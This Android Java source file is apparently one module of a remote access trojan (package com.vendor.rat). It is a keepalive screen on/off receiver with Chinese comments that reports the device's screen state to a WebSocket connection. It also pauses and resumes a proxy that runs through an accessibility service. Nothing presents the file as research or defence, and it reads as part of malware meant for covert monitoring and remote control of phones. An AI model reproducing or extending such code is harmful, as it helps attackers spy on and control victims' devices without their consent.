package com.vendor.rat.keepalive.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.util.Log;

import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.service.MyAccessibilityService;

/**
 * 息屏/亮屏接收器 (模块 07)
 *
 * 必须动态注册（SCREEN_OFF/ON 无法静态注册）
 */
public class ScreenBroadcastReceiver extends BroadcastReceiver {

    private static final String TAG = "ScreenReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();

        if (Intent.ACTION_SCREEN_OFF.equals(action)) {
            Log.d(TAG, "Screen OFF");
            onScreenOff(context);
        } else if (Intent.ACTION_SCREEN_ON.equals(action)) {
            Log.d(TAG, "Screen ON");
            onScreenOn(context);
        }
    }

    private void onScreenOff(Context context) {
        // 上报息屏状态
        if (NetworkManager.getInstance().getWebSocketClient() != null) {
            NetworkManager.getInstance().getWebSocketClient().sendStatus("screen_off");
        }

        // 暂停无障碍代理
        if (MyAccessibilityService.getInstance() != null) {
            MyAccessibilityService.getInstance().pauseProxy();
        }
    }

    private void onScreenOn(Context context) {
        if (NetworkManager.getInstance().getWebSocketClient() != null) {
            NetworkManager.getInstance().getWebSocketClient().sendStatus("screen_on");
        }

        if (MyAccessibilityService.getInstance() != null) {
            MyAccessibilityService.getInstance().resumeProxy();
        }
    }

    /**
     * 动态注册
     */
    public static void register(Context context) {
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        context.registerReceiver(new ScreenBroadcastReceiver(), filter);
    }
}
